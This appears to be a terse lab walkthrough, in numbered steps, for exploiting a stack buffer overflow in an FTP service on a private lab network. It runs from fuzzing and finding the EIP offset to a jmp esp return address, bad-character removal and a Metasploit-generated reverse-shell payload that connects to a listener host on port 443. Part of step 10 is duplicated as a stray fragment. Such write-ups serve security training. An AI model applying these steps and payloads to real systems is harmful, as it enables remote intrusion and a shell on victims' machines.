1. python fuzzer.py 192.168.137.133 21

2. Examine the last length sent. eg 2100

3. /usr/share/metasploit-framework/tools/exploit/pattern_create.rb 2100

4. Use pattern created into fuzzer-eip-02.py

5. python fuzzer-eip-02.py 192.168.137.133 21

6. Examine OllyDebug EIP addr eg 376F4336

7. /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb 376F4336

8. Edit fuzzer-eip-overwrite-03.py, use the offset output eg 2000 for the number of AAAAAAs eg "A"*2000

9. python fuzzer-eip-overwrite-03.py 192.168.137.133 21

10. Examine OllyDebug for EIP overwritten by "42424242". Under 'Executable Module', click on a dll eg Shell32.dll, under the "CPU main thread, module shell32" window, right click -> 'search for' -> 'command' -> 'jmp esp'. Take note of the jmp esp addr eg 0x7C9D30D7.

, click on a dll eg Shell32.dll, under the "CPU main thread, module shell32" window, right click -> 'search for' -> 'command' -> 'jmp esp'. Take note of the jmp esp addr eg 0x7C9D30D7.

11. Edit fuzzer-eip-jmp-esp-4.py and set the return address backwards eg ret = '\xD7\x30\x9D\x7C'. Therefore:

pattern = "A"*2100 + ret + "C"*500 # Our 'exploit' and return address

12. python fuzzer-eip-jmp-esp-4.py 192.168.137.133 21 

13. After OllDebug has crashed, restart it with same attachment, on main menu, 'go to' -> 'expression' -> 0x7C9D30D7. Unpause Olldebug and re-run python fuzzer-eip-jmp-esp-4.py 192.168.137.133 21. Press F7, make sure it hops to "43" (C buffer)

14. Find bad chars

Edit fuzzer-bad-char-5.py
ret = '\xD7\x30\x9D\x7C' 
In Olldebug, repeat step 13.
python fuzzer-bad-char-5.py 192.168.137.133 21

15. Inspect OllyDebug at breakpoint, press F7, examine the hex chars from 01 until FF . Remove the offending chars and repeat step 14 until no more bad chars.

16. Create Shellcode!
/usr/share/framework2/msfpayload win32_reverse LHOST=192.168.137.128 LPORT=443 R | /usr/share/framework2/msfencode -b '\x00\x0a\x0d' -e ShikataGaNai

17. Place the shellcode into exploit2-6.py and run nc listener on 443
nc -nlvp 443
python exploit2-6.py 192.168.137.133 21

18. done

